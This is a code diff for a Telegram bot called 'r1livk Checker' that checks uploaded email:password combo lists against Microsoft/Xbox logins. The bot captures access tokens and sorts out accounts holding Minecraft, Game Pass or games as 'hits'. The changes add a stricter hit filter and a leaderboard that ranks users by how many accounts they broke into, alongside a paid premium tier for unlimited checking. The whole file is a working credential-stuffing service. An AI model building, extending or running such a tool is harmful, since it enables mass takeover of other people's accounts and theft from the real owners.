@@ -1,11 +1,12 @@
 # -*- coding: utf-8 -*-
 """
-r1livk Checker ⚡ - Telegram Bot (Device Token & Pro Inventory Mode + Real Premium)
+r1livk Checker ⚡ - Telegram Bot (Strict Real Hits Only Mode + Leaderboard)
 """
 
 import os
 import re
 import time
+import json
 import threading
 from datetime import date
 from concurrent.futures import ThreadPoolExecutor
@@ -24,6 +25,23 @@ CHANNEL_USERNAME = "@r1iv_k"  # يوزر قناتك الخاص
 bot = telebot.TeleBot(TOKEN)
 
 PREMIUM_USERS_FILE = "premium_users.txt"
+STATS_FILE = "user_stats.json"
+
+def load_json_data(filepath, default_val):
+    if not os.path.exists(filepath):
+        return default_val
+    try:
+        with open(filepath, "r", encoding="utf-8") as f:
+            return json.load(f)
+    except:
+        return default_val
+
+def save_json_data(filepath, data):
+    try:
+        with open(filepath, "w", encoding="utf-8") as f:
+            json.dump(data, f, ensure_ascii=False, indent=4)
+    except:
+        pass
 
 def load_premium_users():
     if not os.path.exists(PREMIUM_USERS_FILE):
@@ -45,8 +63,8 @@ def check_user_subscription(user_id):
         member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
         if member.status in ['member', 'administrator', 'creator']:
             return True
-    except Exception as e:
-        print(f"Error checking subscription: {e}")
+    except Exception:
+        pass
     return False
 
 REQUEST_TIMEOUT = 25
@@ -56,11 +74,25 @@ active_scans = {}
 user_usage = {}  
 DAILY_LIMIT = 2500
 
+def update_user_stats(user_id, checked_count, hits_count, username=None):
+    stats = load_json_data(STATS_FILE, {})
+    uid_str = str(user_id)
+    
+    if uid_str not in stats:
+        stats[uid_str] = {"checked": 0, "hits": 0, "username": username or f"User_{user_id}"}
+    
+    stats[uid_str]["checked"] += checked_count
+    stats[uid_str]["hits"] += hits_count
+    if username:
+        stats[uid_str]["username"] = username
+        
+    save_json_data(STATS_FILE, stats)
+
 def check_daily_limit(chat_id, new_lines_count):
     if chat_id == OWNER_ID or str(chat_id) in load_premium_users():
         return True, new_lines_count
         
-    today = date.today()
+    today = str(date.today())
     if chat_id not in user_usage or user_usage[chat_id]["date"] != today:
         user_usage[chat_id] = {"date": today, "count": 0}
     
@@ -73,7 +105,7 @@ def check_daily_limit(chat_id, new_lines_count):
 
 def update_usage(chat_id, count):
     if chat_id == OWNER_ID or str(chat_id) in load_premium_users(): return 
-    today = date.today()
+    today = str(date.today())
     if chat_id in user_usage and user_usage[chat_id]["date"] == today:
         user_usage[chat_id]["count"] += count
 
@@ -246,8 +278,6 @@ def check_single_account(combo):
         login_text = login_req.text.lower()
 
         ms_token = None
-        
-        # تحسين طريقة التقاط التوكن من الـ URL أو الـ Fragment أو النص
         full_url = login_req.url
         if 'access_token=' in full_url:
             parsed_url = urlparse(full_url)
@@ -326,6 +356,15 @@ def check_single_account(combo):
 
         session.close()
 
+        # 🔥 شرط صارم جداً: هل الحساب يحتوي فعلاً على ميزات أو ألعاب حقيقية؟
+        has_active_gp = "Active" in final_gp or has_gp_basic
+        has_games = len(owned_games_list) > 0
+        is_real_hit = has_mc or has_active_gp or gscore_int > 0 or has_games
+
+        # إذا كان الحساب فارغاً تماماً (0 جي، بدون ألعاب، بدون مايكروسوفت، بدون جيم باس)، نعتبره BAD فوراً
+        if not is_real_hit:
+            return "bad", None
+
         games_str = "\n".join([f"{g}" for g in owned_games_list]) if owned_games_list else "  - No games found / Hidden"
 
         hit_info = (
@@ -335,12 +374,7 @@ def check_single_account(combo):
             f"--------------------------------------------------"
         )
         
-        # تعتبر هيت إذا وُجد أي شيء مميز بالحساب
-        if "Active" in final_gp or has_mc or gscore_int > 0 or len(owned_games_list) > 0:
-            return "hit", {"content": hit_info, "has_mc": has_mc, "has_gp": ("Active" in final_gp or has_gp_basic), "has_xbox": gscore_int > 0}
-        else:
-            # حتى لو لم يكن لديه ألعاب، إذا تم تسجيل الدخول بنجاح يعتبر هيت عادي (بالمفهوم العام للشيكرات)
-            return "hit", {"content": hit_info, "has_mc": has_mc, "has_gp": False, "has_xbox": False}
+        return "hit", {"content": hit_info, "has_mc": has_mc, "has_gp": has_active_gp, "has_xbox": gscore_int > 0 or has_games}
 
     except Exception:
         if session:
@@ -375,11 +409,12 @@ def show_main_menu(message):
 
     markup = types.InlineKeyboardMarkup(row_width=1)
     btn_start = types.InlineKeyboardButton("⚡ Start Checker", callback_data="start_checker")
+    btn_top = types.InlineKeyboardButton("🏆 Leaderboard (Top Users)", callback_data="show_leaderboard")
     btn_premium = types.InlineKeyboardButton("💎 Buy Premium ($15/Month)", callback_data="buy_premium")
     btn_account = types.InlineKeyboardButton("👤 My Account", callback_data="my_account")
-    markup.add(btn_start, btn_premium, btn_account)
+    markup.add(btn_start, btn_top, btn_premium, btn_account)
 
-    today = date.today()
+    today = str(date.today())
     if chat_id == OWNER_ID or str(chat_id) in load_premium_users():
         status_text = "👑 Premium / Owner (Unlimited)"
     else:
@@ -387,10 +422,10 @@ def show_main_menu(message):
         status_text = f"👤 Free ({used}/2500 lines today)"
 
     text = (
-        "⚡ **r1livk Checker Pro (Catalog Mode)** ⚡\n\n"
+        "⚡ **r1livk Checker Pro (Real Hits Only)** ⚡\n\n"
         "Welcome to the ultimate account checking bot.\n"
         f"Your Status: {status_text}\n\n"
-        "Click the button below to start checking your combo files!"
+        "Click a button below to get started!"
     )
     
     if msg_id:
@@ -442,22 +477,47 @@ def callback_query(call):
 
     if call.data == "start_checker":
         markup = types.InlineKeyboardMarkup()
-        btn_cancel = types.InlineKeyboardButton("❌ Cancel", callback_data="cancel_checker")
+        btn_cancel = types.InlineKeyboardButton("❌ Cancel", callback_data="back_to_menu")
         markup.add(btn_cancel)
 
         text = (
-            "🎮 **r1livk Checker - Catalog & Inventory Mode**\n\n"
-            "Full account capture with advanced games extraction:\n"
+            "🎮 **r1livk Checker - Real Hits Mode**\n\n"
+            "Only real accounts with games, gamepass or minecraft will be captured:\n"
             "• Minecraft Accounts\n"
-            "• Xbox Game Pass Status\n"
-            "• Catalog Entitlements Games List\n"
-            "• Gamertag & Profile\n"
-            "• Anti-2FA Protection\n\n"
+            "• Xbox Game Pass Active\n"
+            "• Games Inventory (Gamerscore > 0)\n\n"
             "Send your combo file in .txt format (Direct file upload)\n"
             "Format: `email:password`"
         )
         bot.edit_message_text(text, chat_id=chat_id, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=markup)
     
+    elif call.data == "show_leaderboard":
+        stats = load_json_data(STATS_FILE, {})
+        if not stats:
+            bot.answer_callback_query(call.id, "📊 No stats available yet. Start checking!", show_alert=True)
+            return
+
+        sorted_users = sorted(stats.items(), key=lambda x: (x[1]["hits"], x[1]["checked"]), reverse=True)[:10]
+        
+        lb_text = "🏆 **Top 10 Leaderboard - r1livk Checker** 🏆\n\n"
+        medals = ["🥇", "🥈", "🥉", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣", "🔟"]
+        
+        for idx, (uid, data) in enumerate(sorted_users):
+            medal = medals[idx] if idx < len(medals) else f"#{idx+1}"
+            name = data.get("username", f"User_{uid}")
+            checked_c = data.get("checked", 0)
+            hits_c = data.get("hits", 0)
+            lb_text += f"{medal} **{name}**\n   └ 📊 Checked: `{checked_c}` | 🎯 Hits: `{hits_c}`\n\n"
+
+        markup = types.InlineKeyboardMarkup()
+        btn_back = types.InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")
+        markup.add(btn_back)
+
+        try:
+            bot.edit_message_text(lb_text, chat_id=chat_id, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=markup)
+        except:
+            bot.send_message(chat_id, lb_text, parse_mode="Markdown", reply_markup=markup)
+
     elif call.data == "cancel_checker" or call.data == "back_to_menu":
         active_scans[chat_id] = False
         show_main_menu(call.message)
@@ -470,7 +530,7 @@ def callback_query(call):
         bot.answer_callback_query(call.id, "💎 Premium Plan: $15/Month\nBenefits: Unlimited checking 24/7!\nContact: @r1livk", show_alert=True)
 
     elif call.data == "my_account":
-        today = date.today()
+        today = str(date.today())
         if chat_id == OWNER_ID or str(chat_id) in load_premium_users():
             bot.answer_callback_query(call.id, "Status: Premium / Owner (Unlimited Access)", show_alert=True)
         else:
@@ -506,12 +566,14 @@ def handle_docs(message):
         lines = lines[:lines_to_process_count]
         bot.reply_to(message, f"📥 File received. Processing {len(lines)} lines...")
         active_scans[chat_id] = True
-        threading.Thread(target=process_checker, args=(chat_id, local_path, lines)).start()
+        
+        username = message.from_user.username or message.from_user.first_name
+        threading.Thread(target=process_checker, args=(chat_id, local_path, lines, username)).start()
 
     except Exception as e:
         bot.reply_to(message, f"Error downloading file: {e}")
 
-def process_checker(chat_id, filepath, lines):
+def process_checker(chat_id, filepath, lines, username):
     total = len(lines)
     checked = 0
     hits = 0
@@ -523,7 +585,7 @@ def process_checker(chat_id, filepath, lines):
     xbox_hits = 0
 
     timestamp_str = time.strftime("%Y%m%d_%H%M%S")
-    output_filename = f"r1livk_Checker_CatalogHits_{timestamp_str}.txt"
+    output_filename = f"r1livk_Checker_RealHits_{timestamp_str}.txt"
     start_time = time.time()
 
     markup = types.InlineKeyboardMarkup(row_width=1)
@@ -532,7 +594,7 @@ def process_checker(chat_id, filepath, lines):
     markup.add(btn_stop, btn_back)
 
     initial_status_text = (
-        f"🔥 **LIVE SCAN STATS (Catalog Mode)**\n\n"
+        f"🔥 **LIVE SCAN STATS (Real Hits Only)**\n\n"
         f"📊 Total: {total}\n"
         f"✅ Checked: 0\n"
         f"❌ Bad: 0\n"
@@ -618,32 +680,34 @@ def process_checker(chat_id, filepath, lines):
                     pass
             time.sleep(1.5)
 
+    update_user_stats(chat_id, checked, hits, username)
     update_usage(chat_id, total)
 
     elapsed_total = int(time.time() - start_time)
     t_mins, t_secs = divmod(elapsed_total, 60)
 
     completion_text = (
-        f"✅ **XBOX CATALOG SCAN COMPLETED!**\n\n"
-        f"📊 Total: {total}\n"
-        f"🎯 Hits: {hits}\n"
+        f"✅ **XBOX SCAN COMPLETED!**\n\n"
+        f"📊 Total Checked: {checked}\n"
+        f"🎯 Real Hits: {hits}\n"
         f"  • Minecraft: {mc_hits}\n"
         f"  • GamePass: {gp_hits}\n"
         f"  • Xbox Live: {xbox_hits}\n"
         f"📱 2FA: {twofa}\n"
         f"❌ Bad: {bad}\n\n"
-        f"⏱️ Time: {t_mins:02d}:{t_secs:02d}"
+        f"⏱️ Time: {t_mins:02d}:{t_secs:02d}\n"
+        f"🏆 Stats updated to Leaderboard!"
     )
     bot.send_message(chat_id, completion_text, parse_mode="Markdown")
 
     if hits > 0 and os.path.exists(output_filename):
         with open(output_filename, 'rb') as res_f:
-            bot.send_document(chat_id, res_f, caption=f"📁 Catalog Hits File - r1livk")
+            bot.send_document(chat_id, res_f, caption=f"📁 Real Hits File - r1livk")
 
     if os.path.exists(filepath):
         os.remove(filepath)
     active_scans[chat_id] = False
 
 if __name__ == "__main__":
-    print("r1livk Catalog Mode Checker Bot is running...")
+    print("r1livk Real Hits Checker Bot is running...")
     bot.infinity_polling()
